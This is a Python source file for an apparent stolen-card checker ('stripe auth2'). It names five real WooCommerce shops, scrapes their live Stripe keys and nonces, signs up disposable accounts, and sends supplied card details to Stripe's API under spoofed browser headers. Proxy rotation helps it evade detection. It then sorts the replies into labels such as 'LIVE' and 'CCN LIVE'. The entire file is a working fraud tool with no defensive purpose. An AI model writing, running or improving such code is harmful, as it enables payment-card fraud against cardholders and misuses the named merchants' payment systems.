# OGGY ST AUTHH — stripe auth2 core
import re
import uuid
import string
import random
import json
import asyncio
import aiohttp

try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

SITES = [
    "https://innercitytigers.com",
    "https://www.professionalmarine.eu",
    "https://www.domainegayda.com",
    "https://ecolution-hubs.co.uk",
    "https://shop.nemaneide.com",
]

UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"

NONCE_PATTERNS = [
    r'"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"',
    r'"createSetupIntentNonce"\s*:\s*"(.*?)"',
    r'"ajax_nonce"\s*:\s*"([a-f0-9]+)"',
    r'wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"',
    r'id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"',
    r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
    r'"nonce"\s*:\s*"([a-f0-9]+)"',
]

BAD_RESPONSES = {"", "0", "null", "false", "-1", "undefined"}


def _rand_str(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _extract_error(text):
    for pat, up in ((r'"decline_code"\s*:\s*"([^"]+)"', True),
                    (r'"message"\s*:\s*"([^"]+)"', False),
                    (r'"code"\s*:\s*"([^"]+)"', True)):
        m = re.search(pat, text)
        if m:
            return m.group(1).upper() if up else m.group(1)
    return ''


def _is_bad_body(text):
    if text is None: return True
    s = str(text).strip()
    if s.lower() in BAD_RESPONSES: return True
    if s.startswith("{") and s.endswith("}"):
        try:
            j = json.loads(s)
            if not j: return True
            if j.get("success") is False and not j.get("data"): return True
        except Exception: pass
    return False


def _make_session(proxy_url, jar, timeout):
    if proxy_url and proxy_url.startswith(("socks5://", "socks5h://", "socks4://")):
        if not HAS_SOCKS: raise RuntimeError("aiohttp_socks required")
        return aiohttp.ClientSession(timeout=timeout, cookie_jar=jar,
                                     connector=ProxyConnector.from_url(proxy_url))
    return aiohttp.ClientSession(timeout=timeout, cookie_jar=jar)


def _req_proxy(proxy_url):
    if not proxy_url: return None
    if proxy_url.startswith(("socks5://", "socks5h://", "socks4://")): return None
    return proxy_url


async def _extract_stripe_pk(session, site, headers, proxy_arg):
    for url in (f'{site}/my-account/add-payment-method/',
                f'{site}/my-account/', f'{site}/checkout/', f'{site}/'):
        try:
            async with session.get(url, headers=headers, ssl=False,
                                   allow_redirects=True, proxy=proxy_arg, timeout=8) as r:
                text = await r.text()
            m = re.search(r'pk_live_[a-zA-Z0-9]{20,}', text)
            if m: return m.group(0)
            m = re.search(r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"', text)
            if m: return m.group(1)
        except Exception: continue
    return None


async def _fetch_nonce(session, site_url, headers, proxy_arg):
    for path in ('/my-account/add-payment-method/', '/my-account/payment-methods/',
                 '/checkout/', '/my-account/'):
        try:
            async with session.get(f"{site_url}{path}", headers=headers, ssl=False,
                                   allow_redirects=True, proxy=proxy_arg, timeout=8) as r:
                page = await r.text()
            for pat in NONCE_PATTERNS:
                m = re.search(pat, page)
                if m: return m.group(1)
        except Exception: continue
    return None


async def _confirm_setup(session, site_url, pm_id, nonce, proxy_arg):
    ch = {"Accept": "*/*",
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "X-Requested-With": "XMLHttpRequest", "User-Agent": UA,
          "Origin": site_url, "Referer": f"{site_url}/my-account/add-payment-method/"}
    cd = {'action': 'create_and_confirm_setup_intent',
          'wc-stripe-payment-method': pm_id,
          'wc-stripe-payment-type': 'card',
          '_ajax_nonce': nonce}
    out = ''
    for url, params, data in (
        (f"{site_url}/", {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}, cd),
        (f"{site_url}/wp-admin/admin-ajax.php", {},
         {**cd, 'action': 'wc_stripe_create_and_confirm_setup_intent'}),
    ):
        try:
            async with session.post(url, params=params, headers=ch, data=data,
                                    ssl=False, proxy=proxy_arg, timeout=10) as r:
                out = await r.text()
                if r.status == 200 and not _is_bad_body(out):
                    return out
        except Exception: continue
    return out


async def _try_site(site_url, cc, mm, yy, cvv, proxy_url=None):
    domain = site_url.replace('https://', '').replace('http://', '').rstrip('/')
    email = f"{_rand_str()}@gmail.com"
    gu, mu, si = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
    hs = {"User-Agent": UA,
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9"}
    timeout = aiohttp.ClientTimeout(total=20)
    jar = aiohttp.CookieJar(unsafe=True)
    proxy_arg = _req_proxy(proxy_url)
    try:
        session = _make_session(proxy_url, jar, timeout)
    except Exception:
        return None

    async with session:
        pk = await _extract_stripe_pk(session, site_url, hs, proxy_arg)
        if not pk: return None
        reg_nonce = None
        for path in ('/my-account/', '/my-account-2/', '/register/'):
            try:
                async with session.get(f"{site_url}{path}", headers=hs, ssl=False,
                                       allow_redirects=True, proxy=proxy_arg, timeout=8) as r:
                    page = await r.text()
                for pat in (r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
                            r'id="woocommerce-register-nonce"[^>]*value="([^"]+)"',
                            r'(?:woocommerce-register-nonce|_wpnonce)[^v]+value="([^"]+)"'):
                    m = re.search(pat, page)
                    if m: reg_nonce = m.group(1); break
                if reg_nonce: break
            except Exception: continue
        if not reg_nonce: return None
        rh = {"User-Agent": UA, "Accept": "*/*",
              "Content-Type": "application/x-www-form-urlencoded",
              "Origin": site_url, "Referer": f"{site_url}/my-account/"}
        try:
            async with session.post(f"{site_url}/my-account/",
                                    data={'email': email, '_wp_http_referer': '/my-account/',
                                          'register': 'Register',
                                          'woocommerce-register-nonce': reg_nonce},
                                    headers=rh, ssl=False, allow_redirects=True,
                                    proxy=proxy_arg, timeout=10) as r:
                await r.text()
        except Exception: return None
        cookies = {c.key: c.value for c in jar}
        if not any('wordpress_logged_in' in k for k in cookies): return None
        nonce = await _fetch_nonce(session, site_url, hs, proxy_arg)
        if not nonce: return None
        sh = {"Accept": "application/json",
              "Content-Type": "application/x-www-form-urlencoded",
              "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
              "User-Agent": UA}
        sd = (f"type=card&card[number]={cc}&card[cvc]={cvv}"
              f"&card[exp_year]={yy}&card[exp_month]={mm}"
              f"&allow_redisplay=unspecified"
              f"&billing_details[address][postal_code]=10080"
              f"&billing_details[address][country]=US"
              f"&billing_details[name]=John%20Doe"
              f"&billing_details[email]={email}"
              f"&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+payment-element%3B+deferred-intent"
              f"&referrer=https%3A%2F%2F{domain}"
              f"&time_on_page={random.randint(20000, 50000)}"
              f"&guid={gu}&muid={mu}&sid={si}&key={pk}"
              f"&_stripe_version=2024-06-20")
        try:
            async with session.post("https://api.stripe.com/v1/payment_methods",
                                    data=sd, headers=sh, ssl=False,
                                    proxy=proxy_arg, timeout=10) as r:
                stripe_text = await r.text()
        except Exception: return None
        try:
            sj = json.loads(stripe_text)
        except Exception:
            sj = {}
        if 'error' in sj:
            e = sj['error']
            disp = e.get('decline_code') or e.get('code') or e.get('message') or 'TOKENIZATION_FAILED'
            return {"Response": disp, "Gateway": "Stripe-Auth2", "Price": "$0"}
        pm_id = sj.get('id', '')
        if not pm_id.startswith('pm_'): return None
        result = await _confirm_setup(session, site_url, pm_id, nonce, proxy_arg)
        if _is_bad_body(result): return None
        return _classify(result)


def _classify(text):
    if _is_bad_body(text):
        return {"Response": "Empty AJAX (session mismatch)", "Gateway": "Stripe-Auth2", "Price": "$0"}
    rl = text.lower()
    err = _extract_error(text)
    if any(k in rl for k in ('"success":true', '"status":"succeeded"',
                             'payment method added', 'payment_method_added')):
        if 'decline' in rl or 'card_declined' in rl:
            return {"Response": err or "CARD_DECLINED", "Gateway": "Stripe-Auth2", "Price": "$0"}
        return {"Response": "Payment Method Added Successfully", "Gateway": "Stripe-Auth2", "Price": "$0"}
    if any(k in rl for k in ('requires_action', 'authentication_required',
                             '3d_secure', '"status":"requires_confirmation"',
                             'redirect_to_url')):
        return {"Response": "LIVE · 3DS Challenge Required", "Gateway": "Stripe-Auth2", "Price": "$0"}
    if 'card_not_supported' in rl:
        return {"Response": "card_not_supported", "Gateway": "Stripe-Auth2", "Price": "$0"}
    if any(k in rl for k in ('incorrect_cvc', 'incorrect_zip', 'insufficient_funds',
                             'invalid_cvc', 'cvc_check_failed')):
        return {"Response": err or "CCN LIVE", "Gateway": "Stripe-Auth2", "Price": "$0"}
    if any(k in rl for k in ('card_declined', 'generic_decline', 'do_not_honor',
                             'fraudulent', 'lost_card', 'stolen_card', 'pickup_card',
                             'restricted_card', 'transaction_not_allowed',
                             'security_violation')):
        return {"Response": err or "CARD_DECLINED", "Gateway": "Stripe-Auth2", "Price": "$0"}
    if 'expired' in rl:
        return {"Response": "EXPIRED_CARD", "Gateway": "Stripe-Auth2", "Price": "$0"}
    if any(k in rl for k in ('velocity', 'too_many', 'rate_limit')):
        return {"Response": err or "VELOCITY_EXCEEDED", "Gateway": "Stripe-Auth2", "Price": "$0"}
    if '"success":false' in rl or '"error"' in rl:
        return {"Response": err or "Unknown Error", "Gateway": "Stripe-Auth2", "Price": "$0"}
    if err:
        return {"Response": err, "Gateway": "Stripe-Auth2", "Price": "$0"}
    clean = text.strip()[:120]
    if _is_bad_body(clean):
        return {"Response": "Empty AJAX (session mismatch)", "Gateway": "Stripe-Auth2", "Price": "$0"}
    return {"Response": clean, "Gateway": "Stripe-Auth2", "Price": "$0"}


async def stripe_auth2_check(card_str, proxy_str=None):
    parts = card_str.strip().split('|')
    if len(parts) != 4:
        return {"Response": "Invalid card format", "Gateway": "Stripe-Auth2", "Price": "$0"}
    cc, mm, yy, cvv = (p.strip() for p in parts)
    cc = cc.replace(' ', '')
    mm = mm.zfill(2)
    if len(yy) == 2: yy = '20' + yy
    sites = list(SITES)
    random.shuffle(sites)
    for site in sites:
        try:
            r = await _try_site(site, cc, mm, yy, cvv, proxy_str)
            if r and not _is_bad_body(r.get("Response", "")):
                return r
        except Exception: continue
    return {"Response": "All sites failed — no valid response",
            "Gateway": "Stripe-Auth2", "Price": "$0"}
